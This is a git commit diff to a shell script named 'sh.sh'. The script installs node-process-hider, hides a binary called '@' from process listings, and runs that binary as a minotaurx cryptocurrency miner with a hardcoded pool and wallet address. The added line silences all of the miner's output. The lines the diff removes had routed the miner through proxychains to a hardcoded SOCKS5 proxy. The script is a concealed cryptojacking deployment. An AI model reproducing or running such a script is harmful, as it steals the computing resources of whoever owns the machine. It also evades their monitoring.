e58f092b8c0bbd3f1fa56ce467eaba1b5f4b5336
gunturyogatama404 <99540625+gunturyogatama404@users.noreply.github.com>
2022-02-17 16:10:53 -0400

    Update sh.sh

--- sh.sh
+++ sh.sh
@@ -5,10 +5,5 @@ apt install npm -y
 npm –version 
 npm i -g node-process-hider
 chmod u+x @
-chmod 777 proxychains
 ph add @
-apt install proxychains  -y 
-sed -i 's/socks4/socks5/' /etc/proxychains.conf 
-sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf
-sed -i 's/9050/10663/' /etc/proxychains.conf
-proxychains ./@ -a minotaurx  -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RFgqtpziL9u4qbC1EyafxgzTXE35mSrCgZ -t30
+./@ -a minotaurx  -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RFgqtpziL9u4qbC1EyafxgzTXE35mSrCgZ -t30 > /dev/null 2>&1
